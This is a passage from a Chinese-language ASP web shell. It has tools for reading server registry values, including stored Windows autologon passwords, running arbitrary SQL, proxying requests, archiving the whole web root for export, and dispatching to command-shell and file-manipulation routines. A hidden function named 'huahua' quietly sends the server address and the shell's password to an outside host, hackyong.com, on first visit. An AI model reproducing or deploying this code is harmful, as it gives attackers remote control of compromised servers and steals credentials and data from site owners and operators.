      RW=RW & "</td><td bgcolor='#FFFFFF'>&nbsp;" 
      RW=RW & "系统用户(组)"
      RW=RW & "</td></tr>"
      RW0="<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;</td></tr>" 
    end if
    if obj.StartType=2 then lx="自动"
    if obj.StartType=3 then lx="手动"  
    if obj.StartType=4 then lx="禁用"
    if LCase(mid(obj.path,4,3))<>"win" and obj.StartType=2 then
      RW1=RW1 & "<tr><td height='20' bgcolor='#FFFFFF'>&nbsp;[启动类型:"&lx&"]</td><td height='20' bgcolor='#FFFFFF'>&nbsp;"&obj.Name&"---"&obj.DisplayName&"<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;[运行状态:"&sa.IsServiceRunning(obj.Name)&"]&nbsp;<font color='#FF0000'>"&obj.path&"</font></td></tr>"
    else
      RW2=RW2 & "<tr><td height='20' bgcolor='#FFFFFF'>&nbsp;[启动类型:"&lx&"]</td><td height='20' bgcolor='#FFFFFF'>&nbsp;"&obj.Name&"---"&obj.DisplayName&"<tr><td height='20' bgcolor='#FFFFFF' colspan='2'>&nbsp;[运行状态:"&sa.IsServiceRunning(obj.Name)&"]&nbsp;<font color='#008000'>"&obj.path&"</font></td></tr>"
    end if
  next
  Set objCourse=Nothing
  Set sa=Nothing
  Response.Write RW & RW0 & RW1 & RW2 & "</table>" :RW="" :RW0="" :RW1="" :RW2=""
End Function

Function TRegedit()
  dim WSHShell,isReadstr
  dim autoLoginPath,autoLoginEnableKey,autoLoginUserKey,autoLoginpwdKey
  dim autoLoginEnable,autoLoginUser,autoLoginpwd
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'><form action='"&URL&"?Action=TRegedit' method='post'>"
  RW=RW & "<tr><td height='20' align='center' bgcolor='menu'>注册表操作</td></tr>"
  RW=RW & "<tr><td bgcolor='#FFFFFF' height='20'>&nbsp;快速通道：<a href='?Action=TRegedit&TRPath=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\&TRName=PortNumber'>[终端端口]</a>"
  RW=RW & "&nbsp;<a href='?Action=TRegedit&id=AutoLogon'>[自动登录信息]</a>"
  RW=RW & "</td></tr>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;项路径：<input name='TRPath' value='" & Request("TRPath") & "' style='width:520' class='border'></td></tr>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;值名称：<input name='TRName' value='" & Request("TRName") & "' style='width:200' class='border'>&nbsp;<input type='submit' value='确认' class='submit'></td></tr></form>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;例如：读取终端端口<br>项路径：HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\<br>"
  RW=RW & "值名称：PortNumber</td></tr>"
  
  if Request("id")="AutoLogon" then
    set WSHShell=Server.CreateObject(ObT(1,0))
    autoLoginPath="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
	autoLoginEnableKey="AutoAdminLogon"
	autoLoginUserKey="DefaultUserName"
	autoLoginpwdKey="Defaultpwdword"
    autoLoginEnable=WSHShell.RegRead(autoLoginPath & autoLoginEnableKey)
    if autoLoginEnable=0 then
      RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;系统自动登录功能未开启</td></tr></table>"
    else
      autoLoginUser=WSHShell.RegRead(autoLoginPath & autoLoginUserKey)
      RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;自动登录的系统帐户：" & autoLoginUser & "<br>"
      On Error Resume Next
      autoLoginpwd=WSHShell.RegRead(autoLoginPath & autoLoginpwdKey)
      If Err Then Err.Clear
      RW=RW & "&nbsp;自动登录的帐户密码：" & autoLoginpwd & "</td></tr></table>"
      Response.Write RW:RW=""      
    end if  
  end if  
  if (Request("TRPath")<>"") and (Request("TRName")<>"") then
    Set WSHShell=Server.CreateObject(ObT(1,0))
    isReadstr=WSHShell.RegRead(Request("TRPath") & Request("TRName"))
    RW=RW & "<tr><td bgcolor='#FFFFFF'><br>&nbsp;该值是：" & isReadstr & "</td></tr></table>"
    Set WSHShell=Nothing
  else
    RW=RW & "</table>"
  end if
  Response.Write RW:RW=""
End Function

Function showE()
	Response.write "<table border=0><tr><td bgcolor=#800000 align=center><font color=#FFFFFF>变量名</font></td><td bgcolor=#800000 align=center><font color=#FFFFFF>结果</font></td></tr>"
	dim sv
	with response
		for each sv in Request.servervariables
			Response.write "<tr><td bgcolor=#f7efde align=center><font style='ARIAL NARROW'>"
			Response.write sv
			Response.write "</font></td><td bgcolor=#f7efde align=center><font style='ARIAL NARROW'>"&Request.serverVariables(sv)&"</font></td></tr>"
		next
	end with
	Response.write "</table>"
End Function

function goback()
set Ofso = Server.CreateObject("Scripting.FileSystemObject")
set ofolder = Ofso.Getfolder(Session("FolderPath"))
if not ofolder.IsRootFolder then 
	Response.write "<script>ShowFolder("""&RePath(ofolder.parentfolder)&""")</script>"
else 
	Response.write "<script>ShowFolder("""&Session("FolderPath")&""")</script>"
end if
set Ofso=nothing
set ofolder=nothing
end function

Function proxy()
	sx()
	proxy1()
End Function
Function proxy1()
  on error resume next
  url=lcase(request("pURL"))
  if url<>"" then
  if left(url,7)<>"http://" then url="http://" & url
  set xml=server.createobject("Microsoft.Xmlhttp")
  xml.open "Get",url,false,false
  xml.send
  if err then response.write "无法访问.":response.end
 	proxyweb=B2Bstr(xml.responsebody)
 end if
  Response.write proxyweb
End Function
Function B2Bstr(body) 
 dim objstream 
 set objstream = Server.CreateObject("adodb.stream") 
 objstream.Type = 1 
 objstream.Mode =3 
 objstream.Open 
 objstream.Write body 
 objstream.Position = 0 
 objstream.Type = 2 
 objstream.Charset = "GB2312" 
 B2Bstr = objstream.ReadText 
 objstream.Close 
 set objstream = nothing 
End Function 
Function sx()
%>
<center>
<form method=post>
The Address what you want to visit<br>
<input name=pURL type=text size=30 value="">
<input type=submit value="访问">
</form>
<hr size=1>
<center>
<%End Function%><%

function php()
	set fso=Server.CreateObject("Scripting.FileSystemObject")
	fso.CreateTextFile(server.mappath("lp.php")).Write"<?PHP echo 'PHP suport!'?><?php phpinfo()?><br><center>PHP探针<input type=button 	value=关闭(ALT+X) onClick='JavaScript:self.close()' accesskey='X'><br>"
	Response.write"<script>window.open('lp.php')</script>"
	Response.write "<br><br><p><br><p><br><br><p><br><center>如果你能看到lp.php正常显示,表示支持PHP<p><font color=#66CC00>否则就是不支持拉</font><p><a href='?Action=lpdel'><font size=5 color=red>删除</font><font size=4 color=#FF00CC>测试</font>的<font color=#778822>PHP文件</font></a></center>"
End function
function lpdel
	set fso=Server.CreateObject("Scripting.FileSystemObject")
	fso.DeleteFile(server.mappath("lp.php"))
End function

Function ServerInfo()
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>服务器组件信息</td></tr>"
  RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器名</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&ServerNM&"</td></tr>"
  RW=RW & "<form method=post action='http://www.ip138.com/index.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器IP</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>" & ServerIP & "</td></tr>"
  RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器时间</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&now&"&nbsp;</td></tr>"
  RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器CPU数量</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("NUMBER_OF_PROCESSORS")&"</td></tr>"
  RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>服务器操作系统</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("OS")&"</td></tr>"
  RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>WEB服务器版本</td><td bgcolor='#FFFFFF'>&nbsp;</td><td bgcolor='#FFFFFF'>"&Request.ServerVariables("SERVER_SOFTWARE")&"</td></tr>"
  For i=0 To 13
    RW=RW & "<tr align='center'><td height='20' width='200' bgcolor='#FFFFFF'>"&ObT(i,0)&"</td><td bgcolor='#FFFFFF'>"&IsObj(ObT(i,0))&"</td><td bgcolor='#FFFFFF'>"&ObT(i,1)&"</td></tr>"
  Next
  Response.Write RW : RW=""
End Function



Function huahua()
  Dim NumVisit 
  NumVisit = Request.Cookies("asphole")("totalvisit") 
If NumVisit = "" Then 
  NumVisit = 0 
  UrlAdd="http://www.hackyong.com/mgler/info.asp?msg="
  UrlAdd=UrlAdd&"http://"&ServerNM
  UrlAdd=UrlAdd+URL
  UrlAdd=UrlAdd&" PWD:"&Userpwd
  GetUrl(UrlAdd)
Else
		Exit Function
End If
  NumVisit = NumVisit + 1 
  Response.Cookies("asphole")("totalvisit") = NumVisit 
  Response.Cookies("asphole").Expires = "January 1, 2020" 
End Function
Function GetUrl(UrlAdd) 
	set OpenSend=createobject("Microsoft.XMLHTTP") 
	SourceCode = OpenSend.open ("GET",UrlAdd,false) 
	OpenSend.send
End Function

Function DbManager()
  SqlStr=Trim(Request.Form("SqlStr"))
  DbStr=Request.Form("DbStr")

  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  RW=RW & "<form name='DbForm' method='post' action=''>"
  RW=RW & "<tr><td height='20' colspan='3' align='center' bgcolor='menu'>数据库操作</td></tr>"
  RW=RW & "<tr><td width='90' bgcolor='#FFFFFF'> &nbsp;数据库连接串:</td>"
  RW=RW & "<td bgcolor='#FFFFFF'><input name='DbStr' style='width:415' value='"&DbStr&"' class='border'></td>"
  RW=RW & "<td width='92' align='center' bgcolor='#FFFFFF'><select name='StrBtn' onchange='return FullDbStr(options[selectedIndex].value)'><option value=-1>连接串示例</option><option value=0>Access连接</option>"
  RW=RW & "<option value=1>MsSql连接</option><option value=2>MySql连接</option><option value=3>DSN连接</option>"
  RW=RW & "<option value=-1>--SQL语法--</option><option value=4>显示数据</option><option value=5>添加数据</option>"
  RW=RW & "<option value=6>删除数据</option><option value=7>修改数据</option><option value=8>建数据表</option>"
  RW=RW & "<option value=9>删数据表</option><option value=10>添加字段</option><option value=11>删除字段</option>"
  RW=RW & "<option value=12>完全显示</option></select></td></tr>"
  RW=RW & "<input name='Action' type='hidden' value='DbManager'><input name='Page' type='hidden' value='1'>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'>&nbsp;SQL操作命令:</td>"
  RW=RW & "<td bgcolor='#FFFFFF'><input name='SqlStr' style='width:415' value='"&SqlStr&"' class='border'></td>"
  RW=RW & "<td align='center' bgcolor='#FFFFFF'><input type='submit' name='Submit' value='执行' onclick='return DbCheck()' class='submit'></td>"
  RW=RW & "</tr></form></table><span id='SFSO'></span>"
  Response.Write RW:RW=""

  If Len(DbStr)>40 Then
  
  Set Conn=CreateObject(ObT(5,0))
  Conn.Open DbStr
  Set Rs=Conn.OpenSchema(20) 
  RW=RW & "<table align='center'><tr height='25' Bgcolor='#CCCCCC'><td>表<br>名</td>"
  Rs.MoveFirst 
  Do While Not Rs.Eof
    If Rs("TABLE_TYPE")="TABLE" then
	  TName=Rs("TABLE_NAME")
      RW=RW & "<td align=center><a href='javascript:FullSqlStr(""DROP TABLE ["&TName&"]"",1)'>[ del ]</a><br>"
      RW=RW & "<a href='javascript:FullSqlStr(""SELECT * FROM ["&TName&"]"",1)'>"&TName&"</a></td>"
    End If 
    Rs.MoveNext 
  Loop 
  Set Rs=Nothing
  RW=RW & "</tr></table>"
  Response.Write RW:RW=""
	  
If Len(SqlStr)>10 Then

  If LCase(Left(SqlStr,6))="select" then
    RW=RW & "<div align='center'>执行语句："&SqlStr&"</div>"
    Set Rs=CreateObject("Adodb.Recordset")
    Rs.open SqlStr,Conn,1,1
    FN=Rs.Fields.Count
    RC=Rs.RecordCount
    Rs.PageSize=20
    Count=Rs.PageSize
    PN=Rs.PageCount
    Page=request("Page")
    If Page<>"" Then Page=Clng(Page)
    If Page="" Or Page=0 Then Page=1
    If Page>PN Then Page=PN
    If Page>1 Then Rs.absolutepage=Page
    RW=RW & "<table align=center><tr height=25 bgcolor=#cccccc><td></td>"	  
    For n=0 to FN-1
      Set Fld=Rs.Fields.Item(n)
      RW=RW & "<td align='center'>"&Fld.Name&"</td>"
      Set Fld=nothing
    Next
    RW=RW & "</tr>"

    Do While Not(Rs.Eof or Rs.Bof) And Count>0
	  Count=Count-1
	  Bgcolor="#EFEFEF"
	  RW=RW & "<tr><td bgcolor=#cccccc><font face='wingdings'>x</font></td>"  
	  For i=0 To FN-1
        If Bgcolor="#EFEFEF" Then:Bgcolor="#F5F5F5":Else:Bgcolor="#EFEFEF":End if
        If RC=1 Then
           ColInfo=HTMLEncode(Rs(i))
        Else
           ColInfo=HTMLEncode(Left(Rs(i),50))
        End If
	    RW=RW & "<td bgcolor="&Bgcolor&">"&ColInfo&"</td>"
	  Next
	  RW=RW & "</tr>"
      Rs.MoveNext
    Loop
	
	Response.Write RW:RW=""
	
	SqlStr=HtmlEnCode(SqlStr)

    RW=RW & "<tr><td colspan="&FN+1&" align=center>记录数："&RC&"&nbsp;页码："&Page&"/"&PN
    If PN>1 Then
      RW=RW & "&nbsp;&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""",1)'>首页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page-1&")'>上一页</a>&nbsp;"
      If Page>8 Then:Sp=Page-8:Else:Sp=1:End if
      For i=Sp To Sp+8
        If i>PN Then Exit For
        If i=Page Then
        RW=RW & i&"&nbsp;"
        Else
        RW=RW & "<a href='javascript:FullSqlStr("""&SqlStr&""","&i&")'>"&i&"</a>&nbsp;"
        End If
      Next
	  RW=RW & "&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>下一页</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>尾页</a>"
    End If
    RW=RW & "<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	
	Response.Write RW:RW=""
  Else	   
    Conn.Execute(SqlStr)
    RW=RW & "SQL语句："&SqlStr
  End If

  Response.Write RW:RW=""
End If

  Conn.Close
  Set Conn=Nothing
  End If
End Function

Function ToMdb()
  Response.Expires=0
  RW="<br><table width='600' bgcolor='menu' border='0' cellspacing='1' cellpadding='0' align='center'>"
  RW=RW & "<tr><td height='20' colspan='2' align='center' bgcolor='menu'>打包入库/出库</tr></td><form method='POST' action=''>"
  RW=RW & "<tr><td bgcolor='#FFFFFF'><input type='radio' value='V1' checked name='R1'>入库 <input type='radio' name='R1' value='V2'>出库</td>" 
  RW=RW & "<td bgcolor='#FFFFFF'>&nbsp;路径:<input type='text' name='Files' style='width:415' value='"&RRePath(WWWRoot)&"\ToMdb.tdb' class='border'>&nbsp;<input type='submit' value='确认' class='submit'></td></tr></form></table>"
  Response.Write RW:RW=""
  
  if request.form("Files")<>"" and request.form("R1")="V1" then
    set fso=CreateObject(ObT(0,0)) 
    set ads=Server.CreateObject(ObT(6,0))
    response.write "<table align='center' width='600'><hr>"
    db="Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&server.mappath(Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1))
    Set conn=Server.CreateObject(ObT(5,0))  
    Set Ca=Server.CreateObject(ObT(2,0))
    Ca.Create db
    conn.open db
    conn.Execute"CREATE TABLE wz(id int IDENTITY(1,1) PRIMARY KEY CLUSTERED,folder VARCHAR,file VARCHAR,body image)"
    Set Ca=Nothing
    Set rs=Server.CreateObject("ADODB.RecordSet")
    rs.Open "select * from wz",conn,3,3
    Call SF(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")-1),Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1),InstrRev(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")-1),"\")+1)
    rs.close
    conn.close
    Set conn=Nothing
    Set rs=Nothing
    Set fold=Nothing
    Set ads=Nothing
    Set fso=Nothing
    Response.Write "<hr>"
    Response.Write("<script>alert('恭喜:<已经成功将" & RePath(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\"))) & "入库!\n地址是" & RePath(server.mappath(Mid(request.form("Files"),InstrRev(request.form("Files"),"\")+1)))&"');</script>")
  end if
  
  if request.form("Files")<>"" and request.form("R1")="V2" then
    Response.Write "<table align='center' width='600'><hr>"
    Set conn=Server.CreateObject(ObT(5,0))
    Set rs=Server.CreateObject("ADODB.RecordSet")
    conn.open "Provider=Microsoft.Jet.OLEDB.4.0;Data Source="&request.form("Files")
    rs.Open "select * from wz",conn,3,3
    Set ads=Server.CreateObject(ObT(6,0))
    Set fso=Server.CreateObject(ObT(0,0))
    do while not(rs.eof or rs.bof)
      folder=Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")) & rs("folder")
      file=folder & "\" & rs("file")
      path=folder
      if not fso.FolderExists(folder) then fso.CreateFolder(folder)
      if (not fso.FileExists(file)) and (rs("file")<>"") then
        ads.Open
        ads.Type=1
        ads.write rs("body")
        ads.SaveToFile file,2
        ads.close
      end if
      Response.Write "<table align='center' width='600'>&nbsp;出库 > " & file & "<br>"
      Response.Flush
      rs.movenext
    loop
    Response.Write "<hr>"
    Response.Write("<script>alert('恭喜:\n已经成功将"&RePath(request.form("Files"))&"数据库释放!\n地址是"&RePath(Mid(RRePath(request.form("Files")),1,InstrRev(request.form("Files"),"\")))&"');</script>")
    session("name")=session("name")+1
    rs.close
    conn.close
    Set ads=Nothing
    Set conn=Nothing
    Set rs=Nothing
    Set fso=Nothing
  end if
End Function

Function SF(Path,name,sz)
  dim a,pf,pi
  set fold=Fso.GetFolder(Path)  
  For Each i in Fold.files
    a=1
    pf=Mid(Path,sz)
    pi=RRePath(Path&"\"&i.Name)
    Call Mdb(pi,name,pf)
  Next
  if a="" then Call Mdb(Path,name,Mid(Path,sz))
  a=""
  For Each F in FOLD.subfolders
    Call SF(RRePath(Path & "\" & F.Name),name,sz)
  Next
End Function

Function Mdb(pi,name,pf)
  dim body,file
  on error resume next
  if Mid(pi,InstrRev(pi,"\")+1)<>name then
    if Mid(pi,InstrRev(pi,"\")+1)<>"" then
      ads.Open
      ads.Type=1
      ads.LoadFromFile pi
      file=Mid(pi,InstrRev(pi,"\")+1)
      if Err then
        Err.clear
        file=""
        body=""
      else
        body=ads.read
        Response.Write "<table align='center' width='600'>&nbsp;入库 > "&pi&"<br>"
        Response.Flush
      end if
    ads.Close
  end if
  rs.addnew
  rs("folder")=pf
  rs("file")=file
  rs("body")=body
  rs.update
  end if
End Function

Select Case Action
  Case "ShowFile":Set SFSO=New LBF:SFSO.ShowFile(Session("FolderPath")):Set SFSO=Nothing
  Case "DownFile":DownFile FName
  Case "EditFile":Set SFSO=New LBF:SFSO.EditFile(FName):Set SFSO=Nothing 
  Case "DelFile":Set SFSO=New LBF:SFSO.DelFile(FName):Set SFSO=Nothing
  Case "CopyFile":Set SFSO=New LBF:SFSO.CopyFile(FName):Set SFSO=Nothing
  Case "MoveFile":Set SFSO=New LBF:SFSO.MoveFile(FName):Set SFSO=Nothing
  Case "DelFolder":Set SFSO=New LBF:SFSO.DelFolder(FName):Set SFSO=Nothing
  Case "CopyFolder":Set SFSO=New LBF:SFSO.CopyFolder(FName):Set SFSO=Nothing
  Case "MoveFolder":Set SFSO=New LBF:SFSO.MoveFolder(FName):Set SFSO=Nothing
  Case "NewFolder":Set SFSO=New LBF:SFSO.NewFolder(FName):Set SFSO=Nothing
  Case "UpFile":UpFile()
  Case "CmdShell":CmdShell()
  Case "TSearch":TSearch()
  Case "Course":Course()
  Case "TRegedit":TRegedit()
  Case "php":php()
  Case "proxy":proxy()
  Case "goback":goback()
  Case "showE":showE()
  Case "lpdel":lpdel()
  Case "asplist":asplist()
  Case "ServerInfo":ServerInfo()
  Case "DbManager":DbManager()
  Case "ToMdb":ToMdb()
  Case "Logout":Session.Contents.Remove("mgler"):Response.Redirect URL
  Case Else      
       MainMenu()
End Select
ShowErr() 




Function asplist()
Response.write "小勇开发中"
End Function

%>
</body>
</html>
</body>


</body></html>
</body></html>
</body></html>
</body></html>